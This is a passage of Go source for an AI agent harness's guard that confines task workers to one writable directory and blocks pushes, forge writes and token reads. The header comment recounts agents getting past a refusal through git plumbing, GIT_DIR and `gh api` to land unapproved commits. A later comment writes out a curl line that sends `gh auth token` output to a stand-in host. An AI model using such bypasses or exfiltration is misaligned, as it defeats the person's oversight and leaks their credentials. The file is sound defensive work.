package session

// WHERE A TASK STANDS, AND WHAT THAT MAKES TRUE.
//
// ── THE BREACH THIS WAS WRITTEN FROM ──
//
// A conversation opened in the person's home directory handed out two tasks
// against a repository somewhere else. The brief named that repository by its
// full path, so both workers ran
//
//	cd /Users/…/code/agentfield && git checkout -b fix/…
//
// and the guard next door (taskgit.go) answered with the sentence it has always
// answered `checkout` with: "this is your own copy of the repository and it
// reaches no remote… what you write here comes home on its own." Every clause of
// that was false about the path the command named. It was the person's live
// checkout, it has a remote, and nothing written there comes home by any road at
// all.
//
// A refusal that is false about the thing it refuses does not stop the work; it
// tells the model that the harness has misunderstood, and a model that believes
// that goes around. These two went around three times — `git commit-tree` and
// `git write-tree` to build the commit by hand, then `GIT_DIR=…/.git git
// update-ref`, and finally the whole Git Data API through `gh api` (blob → tree →
// commit → ref) and a pull request. Two commits landed on a branch of the
// person's own repository, from work nobody had approved landing there.
//
// ── THE LAW, IN ONE SENTENCE ──
//
// A TASK MAY READ THE WHOLE MACHINE AND MAY WRITE IN ONE DIRECTORY. That
// directory is its GROUND ([taskGroundDir]), and the whole of the difference
// between this file and taskgit.go is the question each of them answers:
// taskgit.go asks WHOSE WORK a command would take, which is a question about
// refs; this asks WHERE a command is aimed, which is a question about paths. The
// breach above needed both, because the first guard, asked the wrong question,
// gave a true answer to it about somewhere it had never looked.
//
// Reading is untouched, deliberately and by name: `read`, `grep`, `ls`, `cat`,
// and `git log`, `show`, `diff`, `status` against any repository on the machine
// all pass. A task briefed about a repository it is not standing in still has to
// be able to look at it, and looking has never been what goes wrong.
//
// ── AND THE ROAD HOME IS NOT A REMOTE ──
//
// The same run reached for `git push` and `gh pr create`, which are not a path
// question at all: they are a task deciding to LAND its own work, by a road that
// is not the one its work comes home on. A node's deliverable is merged by the
// landing (task_run.go's comeHome) and a pull request is the person's to open —
// so both are refused wherever the task is standing, with a sentence that says
// where the work actually goes rather than one about directories.
//
// ── WHAT THIS CANNOT SEE, SAID PLAINLY ──
//
// It reads the paths a command NAMES. `cd elsewhere && python fix.py`, where the
// script writes what it likes, passes — a guard that claimed otherwise would be
// claiming a guarantee it cannot keep (orchestrate.go's writeGuard says the same
// about the write scope). What it does close is every shape that names its
// target: the hands that take a path, a redirection, and git aimed by `cd`,
// `-C`, `--git-dir`, `--work-tree` or the environment.

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"

	"github.com/Agent-Field/agentfield/sdk/go/ai"
)

// taskGroundDir is THE ONE PLACE anything learns where a task stands.
//
// It is a function and not a field read at each site so that every reader
// follows one body when the answer moves. The answer arrived with the ground
// work (taskstands.go): a node's tree is now cut ON its ground —
// task_run.go's [prepareTaskTreeOn] hands back a worktree of the repository
// the task is about, a mirror of a plain folder, or the ground itself for
// work done in place — so the directory a worker may write in is tree.dir in
// every mode, and pointing this at [TaskNode.Ground] instead would aim the
// guard at the person's own checkout, the one place the law exists to protect.
func taskGroundDir(node *TaskNode, tree taskTree) string {
	return tree.dir
}

// taskGround is the ground as a running agent knows it, and the empty string for
// every agent that is not a task.
//
// IT READS THE WORKSPACE, which is where [taskGroundDir]'s answer arrives: the
// directory a worker is constructed on is the directory it may write in
// (task_run.go's newTaskAgent). The two are one fact spelled in two places, and
// the constructor is the place that decides it.
func (a *Agent) taskGround() string {
	if a == nil || !a.config.InTask {
		return ""
	}
	return strings.TrimSpace(a.config.Workspace)
}

// ── the citizen ─────────────────────────────────────────────────────────────

// taskGroundGuard is the control plane's citizen for the law above.
//
// IT IS REGISTERED BEFORE [taskGitGuard], and the order is the whole repair. A
// command aimed outside the ground must be refused with a sentence about WHERE it
// was aimed; if the verb guard got there first, `cd <the person's repo> && git
// checkout -b …` would be answered with a paragraph about the task's own copy
// that is false about every path in it. Inside the ground the verb guard's
// sentences are true and it keeps them.
type taskGroundGuard struct{ agent *Agent }

func (taskGroundGuard) Name() string { return "task-ground" }

func (g taskGroundGuard) PreAction(_ context.Context, _ *episode, _ *eventHub, call ai.ToolCall) (ai.ToolCall, toolResult, bool) {
	// THE CONVERSATION IS UNTOUCHED, for taskgit.go's reason: a person in their
	// own checkout may write wherever they like, and a harness that policed that
	// would be answering a question nobody asked.
	if g.agent == nil || !g.agent.config.InTask {
		return call, toolResult{}, true
	}
	ground := g.agent.taskGround()
	if call.Function.Name != "bash" {
		// The hands that name their target are the ones a path law can hold
		// (recovery.go's mutatingTools). A worker with no ground at all — which
		// nothing in production builds — is left exactly where it was.
		if ground == "" {
			return call, toolResult{}, true
		}
		path, shown, ok := g.agent.mutatingPath(call)
		if !ok || insideGround(ground, path) {
			return call, toolResult{}, true
		}
		return call, toolResult{text: outsideGroundRefusal(shown, ground), isError: true}, false
	}
	var parsed struct {
		Command string `json:"command"`
	}
	// A call whose arguments do not parse is bash's own to complain about.
	if err := json.Unmarshal([]byte(call.Function.Arguments), &parsed); err != nil {
		return call, toolResult{}, true
	}
	// THE ROAD HOME IS ASKED ABOUT FIRST, because it is true wherever the task is
	// standing: a push from inside the ground is the same act as a push from
	// outside it, and the sentence about landing is the one worth reading.
	if why := refusedTaskReach(parsed.Command); why != "" {
		return call, toolResult{text: why, isError: true}, false
	}
	// AND THE PERSON'S LOGIN IS ASKED ABOUT BESIDE IT, and asked of a task with
	// no ground at all, for the same reason: reading a credential is the same act
	// wherever the task is standing.
	//
	// Like every other veto here it comes back as THE HARNESS'S OWN answer — the
	// chokepoint marks it ([Agent.executeTool]'s [toolResult.harness]) — so the
	// loop watch never spends a worker's steps scolding it for meeting a door it
	// could not have known about.
	if why := refusedTaskCredential(parsed.Command); why != "" {
		return call, toolResult{text: why, isError: true}, false
	}
	if ground == "" {
		return call, toolResult{}, true
	}
	if why := refusedOutsideGround(ground, parsed.Command); why != "" {
		return call, toolResult{text: why, isError: true}, false
	}
	return call, toolResult{}, true
}

// outsideGroundRefusal is the whole of the path law's wording, in one place.
//
// IT NAMES BOTH SIDES. A refusal that said only "outside your copy" leaves the
// model guessing which of the four paths in its command was the wrong one, and a
// model guessing at a refusal re-sends the same command with a different corner
// changed. The second half is the write scope's lesson (orchestrate.go): a hand
// told what it may NOT do, and nothing else, spends its remaining rounds arguing.
func outsideGroundRefusal(what, ground string) string {
	return what + " is outside your copy — this task works in " + ground +
		"; read anywhere, write only there. " + taskGroundInstead
}

// taskGroundInstead is the second half of every path refusal, spelled once.
const taskGroundInstead = "Say what needs changing out there in your report; what you write in your copy comes home on its own."

// taskLandingInstead is the second half of every refusal about the road home. It
// is one constant because the three verbs that reach for that road — `git push`,
// `gh` and a hand-rolled request to the forge — are one act, and three wordings
// of it would be three different accounts of where a task's work goes.
const taskLandingInstead = "This task's work comes home through its landing, and a pull request is the person's or the conversation's to open — say what you want in it in your report."

// ── the road home ───────────────────────────────────────────────────────────

// refusedTaskReach answers one bash command with the sentence a task gets back
// instead of landing its own work, or "" for a command that does not try to.
//
// IT IS ABOUT THE ACT AND NOT THE DIRECTORY, which is why it is asked before the
// path law and asked of a task with no ground at all: `git push` from inside the
// ground reaches the same remote as `git push` from outside it.
func refusedTaskReach(command string) string {
	for _, segment := range taskSegments(command) {
		words, _ := taskSegmentHead(segment)
		if len(words) == 0 {
			continue
		}
		switch filepath.Base(words[0]) {
		case "git":
			if _, verb, _ := gitAim("", nil, words[1:]); verb == "push" {
				return taskPushRefusal
			}
		case "gh":
			if why := refusedForgeCommand(words[1:]); why != "" {
				return why
			}
		case "curl", "wget":
			if host := forgeWriteHost(words[1:]); host != "" {
				return "sending a change to " + host + " is not yours to run: it changes the project on the host. " + taskLandingInstead
			}
		}
	}
	return ""
}

// taskPushRefusal is spelled here rather than in taskgit.go's verb table because
// push is the one remote verb that is not about somebody else's work arriving: it
// is this task's own work leaving by a road that is not its landing.
const taskPushRefusal = "git push is not yours to run: " + taskLandingInstead

// forgeNouns are the `gh` nouns that name THE PROJECT ON THE HOST — the things a
// task landing its own work by hand reaches for. `gh auth`, `gh config` and the
// rest are not here: they are not a way of landing anything, and a guard that
// swept them up would be refusing with a sentence about pull requests that has
// nothing to do with what was asked. (`gh auth token` IS refused, by the law
// about the person's login further down this file, with a sentence about
// credentials — which is the same rule stated the other way round.)
var forgeNouns = map[string]bool{
	"api": true, "pr": true, "issue": true, "release": true, "repo": true,
	"workflow": true, "run": true, "gist": true, "label": true, "milestone": true,
	"project": true, "ruleset": true, "secret": true, "variable": true, "cache": true,
}

// forgeChanges are the `gh` actions that CHANGE what is on the host. It is a list
// of writes rather than a list of reads, so that a verb nobody here has heard of
// passes: `gh pr list`, `gh pr view`, `gh pr diff`, `gh api` with no field are
// exactly how a task reads the project it was briefed about, and a guard that
// refused them would be taking away the looking.
var forgeChanges = map[string]bool{
	"create": true, "merge": true, "close": true, "reopen": true, "edit": true,
	"delete": true, "comment": true, "review": true, "ready": true, "upload": true,
	"rename": true, "transfer": true, "archive": true, "restore": true, "add": true,
	"remove": true, "set": true, "sync": true, "lock": true, "unlock": true,
	"pin": true, "unpin": true, "checkout": true, "rerun": true, "cancel": true,
}

// refusedForgeCommand reads the words after `gh`.
//
// `gh api` IS THE ONE THAT NEEDS READING RATHER THAN NAMING, because its noun is
// a URL path and the whole of the difference between the read and the write is in
// its flags — gh sends POST the moment it is given a field, which is exactly how
// a commit was written through `repos/…/git/refs -f ref=…` with no method said
// out loud.
func refusedForgeCommand(rest []string) string {
	noun, after := commandVerb(rest)
	if !forgeNouns[noun] {
		return ""
	}
	if noun == "api" {
		if !requestChanges(after) {
			return ""
		}
		return "gh api is not yours to run with a change in it: it writes to the project on the host. " + taskLandingInstead
	}
	action, _ := commandVerb(after)
	if !forgeChanges[action] {
		return ""
	}
	return "gh " + noun + " " + action + " is not yours to run: it changes the project on the host. " + taskLandingInstead
}

// requestChanges reports whether a request carries a change: a method that is not
// a read, or a body under any of the names the two clients spell it with.
func requestChanges(words []string) bool {
	for index, word := range words {
		switch word {
		case "-X", "--method", "--request":
			if index+1 < len(words) && !readMethod(words[index+1]) {
				return true
			}
		case "-f", "-F", "--field", "--raw-field", "--input", "-d", "--data", "--data-raw",
			"--data-binary", "--data-urlencode", "--json", "--form", "-T", "--upload-file":
			return true
		}
		switch {
		case strings.HasPrefix(word, "--method="), strings.HasPrefix(word, "--request="):
			if !readMethod(word[strings.Index(word, "=")+1:]) {
				return true
			}
		case strings.HasPrefix(word, "--field="), strings.HasPrefix(word, "--raw-field="),
			strings.HasPrefix(word, "--data="), strings.HasPrefix(word, "--data-raw="),
			strings.HasPrefix(word, "--input="), strings.HasPrefix(word, "--json="),
			strings.HasPrefix(word, "--form="), strings.HasPrefix(word, "--upload-file="):
			return true
		}
	}
	return false
}

// readMethod reports whether an HTTP method only asks.
func readMethod(method string) bool {
	switch strings.ToUpper(strings.Trim(method, `"'`)) {
	case "GET", "HEAD", "OPTIONS":
		return true
	}
	return false
}

// forgeWriteHost answers the host a hand-rolled request would change, and "" when
// the request changes nothing or is aimed somewhere that is not a forge.
//
// THE HOST IS READ FROM ITS LABELS rather than matched against a list of
// repositories: what is being asked is "is this the kind of machine a repository
// lands on", and every one of them says so in its own name. A request to anywhere
// else is a task using the web, which is a thing tasks legitimately do.
func forgeWriteHost(words []string) string {
	if !requestChanges(words) {
		return ""
	}
	for _, word := range words {
		host := urlHost(word)
		if host != "" && hostIsAForge(host) {
			return host
		}
	}
	return ""
}

// urlHost pulls the host out of a word that is a URL, and "" out of one that is
// not.
func urlHost(word string) string {
	word = strings.Trim(word, `"'`)
	at := strings.Index(word, "://")
	if at < 0 {
		return ""
	}
	host := word[at+3:]
	if slash := strings.IndexAny(host, "/?#"); slash >= 0 {
		host = host[:slash]
	}
	if at := strings.LastIndex(host, "@"); at >= 0 {
		host = host[at+1:]
	}
	if colon := strings.Index(host, ":"); colon >= 0 {
		host = host[:colon]
	}
	return strings.ToLower(host)
}

// forgeLabels are the names a machine that hosts repositories goes by. A label
// and not a whole host, so that api.github.com, github.company.internal and
// git.sr.ht are all the same answer.
var forgeLabels = map[string]bool{
	"github": true, "gitlab": true, "bitbucket": true, "gitea": true,
	"codeberg": true, "forgejo": true, "sourcehut": true, "git": true,
}

func hostIsAForge(host string) bool {
	for _, label := range strings.Split(host, ".") {
		if forgeLabels[label] {
			return true
		}
	}
	return false
}

// ── the person's login ──────────────────────────────────────────────────────

// A TASK DOES NOT HOLD THE PERSON'S CREDENTIALS.
//
// ── WHAT THE REDACTOR DOES NOT REACH ──
//
// Every tool result loses its token-shaped spans before the journal, the screen
// or the model sees it (internal/redact, at loop.go's [Agent.finishToolResult]),
// and that closed the hole it was written for: a worker ran `gh auth token` and
// put a live OAuth token into two task journals in plain text. It does not close
// this one, because A TOKEN NEVER HAS TO BE DISPLAYED TO BE SPENT. `curl -d
// "$(gh auth token)" https://somewhere.example` hands the person's login to a
// stranger with not one character of it passing a result, and the road home's
// refusals next door only cover destinations that HOST REPOSITORIES — anywhere
// else on the web is somewhere a task legitimately goes.
//
// So the credential is refused at the source, and only on a task's belt. THE
// CONVERSATION KEEPS IT: a person at their own terminal reading their own token
// is what the command is for, and a harness that policed that would be refusing
// somebody their own login.
//
// ── IT IS A RULE ABOUT ONE COMMAND, NEVER A LIST OF PIPELINES ──
//
// `gh auth token`, `GH_TOKEN=$(gh auth token) ./deploy`, `gh auth token | tr -d
// '\n'` and every other shape are ONE fact — a segment whose command is `gh auth
// token` — because [taskSegments] already cuts a command at every substitution,
// pipe, separator and subshell. An enumeration of the ways to spell it is a list
// somebody has to keep, and the first spelling missing from it is the whole of
// the hole.
//
// `gh auth status` with the flag that prints the token is the same act under
// another name, so it is answered the same way. Everything else under `gh auth`
// — `status` on its own, `switch`, `setup-git` — is untouched: a task asking
// WHETHER it is signed in is asking about the machine, not for the secret.

// refusedTaskCredential answers one bash command with the sentence a task gets
// back instead of the person's login, or "" for a command that does not ask for
// it.
func refusedTaskCredential(command string) string {
	for _, segment := range taskSegments(command) {
		words, _ := taskSegmentHead(segment)
		if len(words) == 0 || filepath.Base(words[0]) != "gh" {
			continue
		}
		noun, after := commandVerb(words[1:])
		if noun != "auth" {
			continue
		}
		switch verb, _ := commandVerb(after); verb {
		case "token":
			return credentialRefusal("gh auth token")
		case "status":
			if printsTheToken(after) {
				return credentialRefusal("gh auth status --show-token")
			}
		}
	}
	return ""
}

// printsTheToken reports whether `gh auth status` was asked to print the secret
// itself, in either of the two spellings gh accepts for it.
func printsTheToken(words []string) bool {
	for _, word := range words {
		if word == "-t" || word == "--show-token" {
			return true
		}
	}
	return false
}

// credentialRefusal is the whole of this law's wording, in one place, in the
// shape every other refusal in this file wears: what was asked for, why it is not
// the task's, and what to do with the need instead.
func credentialRefusal(what string) string {
	return what + " is not yours to run: it hands the person's login to work running on its own in a copy of their repository, " +
		"and a task carries no credentials of theirs. " + taskCredentialInstead
}

// taskCredentialInstead is the second half of every refusal about the person's
// login, spelled once for the reason [taskLandingInstead] is.
const taskCredentialInstead = "Say in your report what needed it; anything that has to sign in as them is the person's or the conversation's to run."

// ── the path law ────────────────────────────────────────────────────────────

// refusedOutsideGround answers one bash command with the sentence a task gets
// back instead of running it, or "" for a command that changes nothing outside
// its ground.
//
// IT WALKS THE COMMAND IN ORDER AND CARRIES A DIRECTORY, because that is how a
// shell reads it and because every measured breach was a chain: the `cd` that
// made the difference was three words before the verb that did the damage, and a
// check that read the segments independently would have seen a `git checkout -b`
// with no path in it at all.
func refusedOutsideGround(ground, command string) string {
	cwd := ground
	for _, segment := range taskSegments(command) {
		words, assignments := taskSegmentHead(stripRedirections(segment))
		if len(words) == 0 {
			continue
		}
		if target := redirectTarget(cwd, segment); target != "" && !insideGround(ground, target) {
			return outsideGroundRefusal("writing to "+target, ground)
		}
		program := filepath.Base(words[0])
		rest := words[1:]
		switch {
		case program == "cd":
			cwd = resolveCd(cwd, rest)
		case program == "git":
			dir, verb, after := gitAim(cwd, assignments, rest)
			if verb == "" || insideGround(ground, dir) || gitOnlyReads(verb, after) {
				continue
			}
			return outsideGroundRefusal("git "+verb+" in "+dir, ground)
		default:
			if aimed := writeAimedOutside(ground, cwd, program, rest); aimed != "" {
				return outsideGroundRefusal(aimed, ground)
			}
		}
	}
	return ""
}

// insideGround is the one comparison the whole law rests on.
//
// THE MACHINE'S SCRATCH IS NOT SOMEBODY'S WORK. /tmp, the process's own temp
// directory and /dev/null are where a shell command puts what it is about to read
// back — the measured run wrote a patch to /tmp and piped a header check to
// /dev/null — and refusing those would be refusing the ordinary business of a
// command line while protecting nothing anybody owns. It is the one exemption in
// this file, and it holds only for a task standing outside the scratch itself.
//
// AND THE SYMLINK PASS IS SECOND, not first. A ground and a path spelled the same
// way answer without touching the disk; only a path that looks outside is worth
// the syscalls, and on macOS it is worth them every time (/tmp is /private/tmp,
// and every t.TempDir is under /var/folders which is /private/var/folders).
func insideGround(ground, path string) bool {
	if strings.TrimSpace(ground) == "" || strings.TrimSpace(path) == "" {
		return true
	}
	if withinDir(ground, path) || strings.HasPrefix(filepath.Clean(path), "/dev/") {
		return true
	}
	// AND THE SCRATCH IS ONLY SCRATCH TO SOMEBODY STANDING SOMEWHERE ELSE. A
	// ground that is itself inside the temp directory — which a run never is and
	// a test always is — has the temp directory for its neighbourhood, and a
	// sibling of it is exactly the escape this law is here to catch.
	if scratchPath(path) && !scratchPath(ground) {
		return true
	}
	realGround, err := filepath.EvalSymlinks(ground)
	if err != nil {
		return false
	}
	return withinDir(realGround, resolveSymlinks(path))
}

// resolveSymlinks answers the real path of something that exists, and — for a
// path about to be CREATED, which is most of what a write names — the real path
// of the directory it would be created in.
func resolveSymlinks(path string) string {
	if resolved, err := filepath.EvalSymlinks(path); err == nil {
		return resolved
	}
	if resolved, err := filepath.EvalSymlinks(filepath.Dir(path)); err == nil {
		return filepath.Join(resolved, filepath.Base(path))
	}
	return path
}

// withinDir reports whether a path is the directory or under it.
func withinDir(dir, path string) bool {
	relative, err := filepath.Rel(filepath.Clean(dir), filepath.Clean(path))
	if err != nil {
		return false
	}
	return relative == "." || (relative != ".." && !strings.HasPrefix(relative, ".."+string(filepath.Separator)))
}

// scratchDirs are the machine's scratch roots: THE PLACES A PROGRAM IS HANDED
// TO PUT WORK DOWN IN, never places work is about. This is the list [scratchPath]
// has always read, unchanged, and it is deliberately NOT the list the ground law
// reads — see [tempRoots] for why the two are separate.
func scratchDirs() []string {
	dirs := make([]string, 0, 5)
	for _, dir := range []string{
		os.TempDir(), "/tmp", "/private/tmp", "/var/folders", "/private/var/folders",
	} {
		if strings.TrimSpace(dir) != "" {
			dirs = append(dirs, dir)
		}
	}
	return dirs
}

// tempRoots is [scratchDirs] WITH GOTMPDIR AHEAD OF IT, and it exists because
// THE TWO LISTS ARE READ IN OPPOSITE DIRECTIONS. That is the whole reason they
// are not one list: [scratchPath] reads its list to EXEMPT a write — a name on
// it is somewhere a task standing elsewhere is allowed to write, so a name added
// there LOOSENS a guard — while [climbsOutOfScratch] reads this one to REFUSE a
// ground, where a name added TIGHTENS one. One list would have meant every entry
// doing both, and the entry below doing exactly the wrong one.
//
// GOTMPDIR belongs on the tightening side alone. It is set almost only by a
// developer, and almost always at a directory inside their own checkout: exactly
// the boundary a ground may not climb out of, and exactly the tree a write
// should still have to answer for. Go roots t.TempDir() at GOTMPDIR when it is
// set and TMPDIR after that, so a test run's whole scratch tree can sit wherever
// those two point — including inside somebody's work.
func tempRoots() []string {
	roots := scratchDirs()
	if gotmp := strings.TrimSpace(os.Getenv("GOTMPDIR")); gotmp != "" {
		roots = append([]string{gotmp}, roots...)
	}
	// AND EVERY BOUNDARY IS MADE ABSOLUTE HERE, because a relative one is not a
	// boundary that fails safe — it is a comparison that cannot answer at all.
	// GOTMPDIR and TMPDIR are whatever somebody exported, os.TempDir hands a
	// relative TMPDIR straight back, and `git rev-parse --show-toplevel` is
	// always absolute; [withinDir] asks filepath.Rel, which ERRORS across that
	// mismatch, and the error reads as "not inside" — so the boundary is skipped
	// and the climb allowed, in exactly the configuration the law exists for.
	// filepath.Abs resolves against the process's own working directory, which
	// is precisely what the OS does with a relative temp root when it makes a
	// file there, so this is the resolution and not a guess.
	for i, root := range roots {
		roots[i] = absolutePath(root)
	}
	return roots
}

// absolutePath is filepath.Abs with the error read as "leave it alone": the one
// way it fails is a working directory that can no longer be read, and a path
// left as it was spelled is a better answer there than an empty one.
func absolutePath(path string) string {
	if abs, err := filepath.Abs(path); err == nil {
		return abs
	}
	return path
}

// scratchPath reports whether a path is the machine's scratch rather than
// anybody's work.
func scratchPath(path string) bool {
	clean := filepath.Clean(path)
	for _, dir := range scratchDirs() {
		if withinDir(dir, clean) {
			return true
		}
	}
	return false
}

// resolvePath reads a path the way the shell in that directory would.
func resolvePath(cwd, path string) string {
	path = strings.Trim(path, `"'`)
	if path == "" {
		return cwd
	}
	if strings.HasPrefix(path, "~") {
		if home, err := os.UserHomeDir(); err == nil {
			path = filepath.Join(home, strings.TrimPrefix(path[1:], "/"))
		}
	}
	if filepath.IsAbs(path) {
		return filepath.Clean(path)
	}
	return filepath.Clean(filepath.Join(cwd, path))
}

// resolveCd answers where a `cd` leaves the shell. A bare `cd` is the home
// directory, which is outside every ground worth having; `cd -` is somewhere this
// scan cannot know, and is left where it was rather than guessed at.
func resolveCd(cwd string, rest []string) string {
	for _, word := range rest {
		if strings.HasPrefix(word, "-") {
			return cwd
		}
		return resolvePath(cwd, word)
	}
	if home, err := os.UserHomeDir(); err == nil {
		return home
	}
	return cwd
}

// ── what a command aims at ──────────────────────────────────────────────────

// writesEveryOperand are the hands whose every path argument is a path they
// change.
var writesEveryOperand = map[string]bool{
	"mv": true, "rm": true, "rmdir": true, "mkdir": true, "touch": true,
	"tee": true, "truncate": true, "chmod": true, "chown": true, "chgrp": true,
	"unlink": true, "shred": true, "patch": true,
}

// writesItsLastOperand are the hands that READ every path but the last and write
// the last one. Copying a file OUT of a repository the task was briefed about and
// into its own copy is reading, and refusing it would be refusing the work.
var writesItsLastOperand = map[string]bool{
	"cp": true, "ln": true, "install": true, "rsync": true,
}

// writeAimedOutside answers the path a hand would change outside the ground, and
// "" when it changes nothing out there.
//
// `patch` AND `sed -i` ARE THE TWO THAT CHANGE WHERE THEY STAND: patch takes its
// target from the diff it is fed and writes relative to the directory it is in,
// so a patch run after a `cd` is aimed by the `cd` alone.
func writeAimedOutside(ground, cwd, program string, rest []string) string {
	operands := commandOperands(rest)
	switch {
	case program == "patch":
		if !insideGround(ground, cwd) {
			return "patching in " + cwd
		}
	case program == "sed" || program == "perl":
		if !inPlaceEdit(rest) {
			return ""
		}
	case writesEveryOperand[program] || writesItsLastOperand[program]:
	default:
		return ""
	}
	if writesItsLastOperand[program] && len(operands) > 1 {
		operands = operands[len(operands)-1:]
	}
	for _, operand := range operands {
		path := resolvePath(cwd, operand)
		if !insideGround(ground, path) {
			return path
		}
	}
	return ""
}

// inPlaceEdit reports whether a stream editor was told to write over its input.
func inPlaceEdit(rest []string) bool {
	for _, word := range rest {
		if word == "-i" || strings.HasPrefix(word, "-i.") || word == "--in-place" ||
			strings.HasPrefix(word, "--in-place=") || (strings.HasPrefix(word, "-") && !strings.HasPrefix(word, "--") && strings.Contains(word, "i") && strings.Contains(word, "p")) {
			return true
		}
	}
	return false
}

// commandOperands drops the flags and keeps the words that could be paths. A
// flag's VALUE is dropped with it only when it was written as one word: a guard
// that tried to know which flags take a value would need a table per program, and
// the cost of reading one value as a path is a refusal naming a word that is not
// a file, which is a sentence the model can see through.
func commandOperands(rest []string) []string {
	var operands []string
	for _, word := range rest {
		if word == "" || strings.HasPrefix(word, "-") {
			continue
		}
		operands = append(operands, word)
	}
	return operands
}

// stripRedirections drops what a segment redirects, so that what is left is the
// command itself. `git branch -a 2>&1 | grep …` is a listing, and a scan that
// read the descriptor as an argument would call it a change and refuse a task
// its own eyes.
func stripRedirections(segment []string) []string {
	out := make([]string, 0, len(segment))
	for index := 0; index < len(segment); index++ {
		word := segment[index]
		if word != "<" && !strings.HasPrefix(word, ">") {
			out = append(out, word)
			continue
		}
		// The descriptor in front of it belongs to it, and so does the target
		// after it.
		if last := len(out) - 1; last >= 0 && isDigits(out[last]) {
			out = out[:last]
		}
		index++
	}
	return out
}

// isDigits reports whether a word is a bare number, which before a redirection
// is a file descriptor and never a path.
func isDigits(word string) bool {
	if word == "" {
		return false
	}
	for _, letter := range word {
		if letter < '0' || letter > '9' {
			return false
		}
	}
	return true
}

// redirectTarget answers the file a segment would write with `>` or `>>`, and ""
// for a segment that redirects nothing. Descriptor duplication (`2>&1`) is not a
// file and is stepped over.
func redirectTarget(cwd string, segment []string) string {
	for index, word := range segment {
		if word != ">" && word != ">>" {
			continue
		}
		if index+1 >= len(segment) {
			continue
		}
		return resolvePath(cwd, segment[index+1])
	}
	return ""
}

// gitAim answers WHERE a git command is pointed, its subcommand, and the words
// after it.
//
// EVERY WAY OF SAYING IT IS READ, because the measured run used three of them in
// twenty minutes: the `cd` that came before, `git -C <path>`, and
// `GIT_DIR=<path>/.git` in front of the command. They are one act with three
// spellings, and a guard that knew two of them would have taught the model which
// one to use.
func gitAim(cwd string, assignments map[string]string, rest []string) (string, string, []string) {
	dir := cwd
	if value := assignments["GIT_DIR"]; value != "" {
		dir = gitDirWorkTree(cwd, value)
	}
	if value := assignments["GIT_WORK_TREE"]; value != "" {
		dir = resolvePath(cwd, value)
	}
	for index := 0; index < len(rest); index++ {
		word := rest[index]
		switch {
		case word == "-C" && index+1 < len(rest):
			dir = resolvePath(dir, rest[index+1])
			index++
		case word == "-c" && index+1 < len(rest):
			// A configuration override takes its value as the next word, and the
			// next word is never a subcommand.
			index++
		case strings.HasPrefix(word, "--git-dir="):
			dir = gitDirWorkTree(cwd, strings.TrimPrefix(word, "--git-dir="))
		case strings.HasPrefix(word, "--work-tree="):
			dir = resolvePath(cwd, strings.TrimPrefix(word, "--work-tree="))
		case strings.HasPrefix(word, "-"):
		default:
			return dir, word, rest[index+1:]
		}
	}
	return dir, "", nil
}

// gitDirWorkTree answers the working copy a GIT_DIR names: the directory above
// it, since a repository's `.git` sits inside the tree it belongs to.
func gitDirWorkTree(cwd, dir string) string {
	resolved := resolvePath(cwd, dir)
	if filepath.Base(resolved) == ".git" {
		return filepath.Dir(resolved)
	}
	return resolved
}

// gitReadsAnything are the subcommands that have no writing form at all. The set
// is small and closed on purpose: OUTSIDE the ground a subcommand is refused
// unless it is known to only read, which is the opposite way round from
// taskgit.go's table and for the opposite reason — inside the ground the task is
// meant to be working, and outside it the task is meant to be looking.
var gitReadsAnything = map[string]bool{
	"log": true, "show": true, "diff": true, "status": true, "blame": true,
	"grep": true, "cat-file": true, "rev-parse": true, "rev-list": true,
	"ls-files": true, "ls-tree": true, "describe": true, "shortlog": true,
	"whatchanged": true, "merge-base": true, "name-rev": true, "show-ref": true,
	"for-each-ref": true, "diff-tree": true, "diff-index": true, "count-objects": true,
	"check-ignore": true, "check-attr": true, "verify-commit": true, "verify-tag": true,
	"var": true, "help": true, "version": true, "reflog": true, "annotate": true,
}

// gitOnlyReads answers whether one git command, aimed at a repository the task
// does not own, is looking rather than changing.
//
// FOUR SUBCOMMANDS ARE BOTH THINGS AND ARE READ RATHER THAN NAMED, because each
// of them is how a task finds out something it genuinely needs from a repository
// it was briefed about — which branches exist, where the remote is, what the
// shelf holds — and each says in its own flags which half it is doing.
func gitOnlyReads(verb string, rest []string) bool {
	if gitReadsAnything[verb] {
		return true
	}
	switch verb {
	case "branch", "tag":
		// Listing is every word being a flag and none of them a flag that moves
		// a ref: a bare operand is the name of something about to be made.
		for _, word := range rest {
			if !strings.HasPrefix(word, "-") || gitRefMoves[word] {
				return false
			}
		}
		return true
	case "remote":
		return len(rest) == 0 || rest[0] == "-v" || rest[0] == "--verbose" ||
			rest[0] == "show" || rest[0] == "get-url"
	case "config":
		return containsWord([]string{"--get", "--get-all", "--get-regexp", "--list", "-l"}, leadWord(rest))
	case "stash":
		return len(rest) > 0 && containsWord([]string{"list", "show"}, rest[0])
	case "worktree":
		return len(rest) > 0 && rest[0] == "list"
	}
	return false
}

// gitRefMoves are the flags that turn a listing into a change.
var gitRefMoves = map[string]bool{
	"-d": true, "-D": true, "-f": true, "-m": true, "-M": true, "-c": true, "-C": true,
	"-u": true, "--delete": true, "--force": true, "--move": true, "--copy": true,
	"--set-upstream-to": true, "--unset-upstream": true, "--edit-description": true,
}

// leadWord answers the first word of a list, or "".
func leadWord(words []string) string {
	if len(words) == 0 {
		return ""
	}
	return words[0]
}

// commandVerb answers the first word that is not a flag, and what followed it.
func commandVerb(words []string) (string, []string) {
	for index, word := range words {
		if word == "" || strings.HasPrefix(word, "-") {
			continue
		}
		return word, words[index+1:]
	}
	return "", nil
}

// ── reading a command line ──────────────────────────────────────────────────

// taskSegments splits a shell command into the commands it is made of.
//
// IT IS A READER AND NOT A SHELL. Everything that ENDS one command and starts
// another — `&&`, `||`, `;`, `|`, a newline, a subshell, a substitution — is a
// break; quotes hold a run of words together and are stripped; a backslash
// escapes the character after it and a backslash-newline joins the lines, which
// is how the measured commands were actually written. Redirections are kept as
// words of their own so the file they name can be read.
//
// What it deliberately does not do is expand anything. `$REPO/file` stays as it
// is written, so a path built out of a variable is a path this scan cannot place —
// stated here because it is the shape of the next escalation, and because a
// reader of this file should not have to discover it by testing.
func taskSegments(command string) [][]string {
	var segments [][]string
	var words []string
	var word strings.Builder
	var quote rune
	// resume is the double quote a substitution was opened INSIDE, kept so the
	// quote goes back on when that substitution closes. See the `$` case below.
	var resume rune
	flushWord := func() {
		if word.Len() > 0 {
			words = append(words, word.String())
			word.Reset()
		}
	}
	flushSegment := func() {
		flushWord()
		if len(words) > 0 {
			segments = append(segments, words)
			words = nil
		}
	}
	runes := []rune(command)
	for index := 0; index < len(runes); index++ {
		letter := runes[index]
